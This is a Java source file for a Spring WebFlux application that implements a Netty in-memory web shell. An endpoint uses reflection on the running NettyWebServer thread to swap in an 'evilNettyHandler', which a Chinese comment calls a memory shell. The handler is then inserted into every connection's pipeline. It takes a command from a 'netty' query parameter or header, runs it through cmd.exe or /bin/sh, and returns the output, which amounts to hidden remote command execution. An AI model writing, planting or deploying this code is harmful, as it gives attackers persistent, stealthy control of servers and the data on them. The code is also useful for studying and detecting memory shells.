package com.flux;

import io.netty.channel.*;
import io.netty.handler.codec.http.HttpHeaders;
import io.netty.handler.codec.http.HttpRequest;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import reactor.netty.ChannelPipelineConfigurer;
import reactor.netty.ConnectionObserver;
import reactor.netty.http.server.HttpServerConfig;


import io.netty.buffer.Unpooled;
import io.netty.handler.codec.http.DefaultFullHttpResponse;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpResponseStatus;
import io.netty.handler.codec.http.HttpVersion;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.SocketAddress;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

@RestController
public class NettyHandler {

    @RequestMapping("/nettyHandler")
    public String nettyHandler() throws Exception {
        Thread thread =null;
        for (Thread t : Thread.getAllStackTraces().keySet()) {
            if (t.getClass().getName().contains("NettyWebServer")) {
                thread = t;
            }
        }
        evilNettyHandler evil = new evilNettyHandler();
        // reactor.netty.transport.ServerTransport$InetDisposableBind@4b9bf884
        Object o1 = Utils.getField(thread ,"val$disposableServer");
        // reactor.netty.http.server.HttpServerConfig@3a9528c9 |reactor.netty.http.server.HttpServerConfig
        Object o2 = Utils.getField(o1 ,"config");
        Field _doOnChannelInit = o2.getClass().getSuperclass().getSuperclass().getDeclaredField("doOnChannelInit");
        _doOnChannelInit.setAccessible(true);
        _doOnChannelInit.set(o2 ,evil);
        return "success";

    }
}
class evilNettyHandler extends ChannelDuplexHandler implements ChannelPipelineConfigurer {
    public static String paramName = "netty";
    @Override
    public void channelRead(ChannelHandlerContext channelHandlerContext, Object obj) throws Exception {
        if (!(obj instanceof HttpRequest)) {
            channelHandlerContext.fireChannelRead(obj);
            return;
        }
        HttpRequest httpRequest = (HttpRequest) obj;
        HttpHeaders headers = httpRequest.headers();
        String paramFromUrl = getParamFromUrl(httpRequest.uri(), paramName);
        if (paramFromUrl == null || paramFromUrl.isEmpty()) {
            paramFromUrl = headers.get(paramName);
        }
        if (paramFromUrl == null) {
            channelHandlerContext.fireChannelRead(obj);
            return;
        }
        String str = "";
        try {
            str = new Scanner(getInputStream(getParam(paramFromUrl))).useDelimiter("\\A").next();
        } catch (Throwable th) {
        }
        send(channelHandlerContext, str.toString());
    }

    private void send(ChannelHandlerContext channelHandlerContext, String str) throws Exception {
        DefaultFullHttpResponse defaultFullHttpResponse = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(str, StandardCharsets.UTF_8));
        defaultFullHttpResponse.headers().set("Content-Type", "text/plain; charset=UTF-8");
        defaultFullHttpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, Integer.valueOf(defaultFullHttpResponse.content().readableBytes()));
        channelHandlerContext.channel().writeAndFlush(defaultFullHttpResponse).addListener(ChannelFutureListener.CLOSE);
    }

    public String getParamFromUrl(String str, String str2) throws Exception {
        String query = new URI(str).getQuery();
        if (query == null) {
            return null;
        }
        for (String str3 : query.split("&")) {
            String[] split = str3.split("=", 2);
            String str4 = split.length > 0 ? split[0] : null;
            if (split.length > 1 && str4 != null && str4.equals(str2)) {
                return split[1];
            }
        }
        return null;
    }

    private String getParam(String str) {
        return str;
    }

    private InputStream getInputStream(String str) throws Exception {
        String[] split;
        String str2 = null;
        if (0 == 0) {
            split = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
        } else if (str2.contains("\"{command}\"")) {
            String[] split2 = str2.split("\\s+");
            for (int i = 0; i < split2.length; i++) {
                split2[i] = split2[i].replace("\"{command}\"", str);
            }
            split = split2;
        } else {
            split = str2.replace("{command}", str).split("\\s+");
        }
        return new ProcessBuilder(split).redirectErrorStream(true).start().getInputStream();
    }

    @Override
    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress remoteAddress) {
        ChannelPipeline pipeline = channel.pipeline();
        // 将内存马的handler添加到spring层handler的前面
        // pipeline顺序
        /**
         * TransportConfig$TransportChannelInitializer#0 -> reactor.netty.transport.TransportConfig$TransportChannelInitializer
         * reactor.left.httpCodec -> io.netty.handler.codec.http.HttpServerCodec
         * memshell -> com.flux.evilNettyHandler
         * reactor.left.httpTrafficHandler -> reactor.netty.http.server.HttpTrafficHandler
         * reactor.right.reactiveBridge -> reactor.netty.channel.ChannelOperationsHandler
         */
        pipeline.addBefore("reactor.left.httpTrafficHandler","memshell",new evilNettyHandler());
        try {
            pipeline.names().forEach(name -> {
                ChannelHandler handler = pipeline.get(name);
                System.out.println(name + " -> " + handler.getClass().getName());
            });
        } catch (Exception e) {

        }


    }
}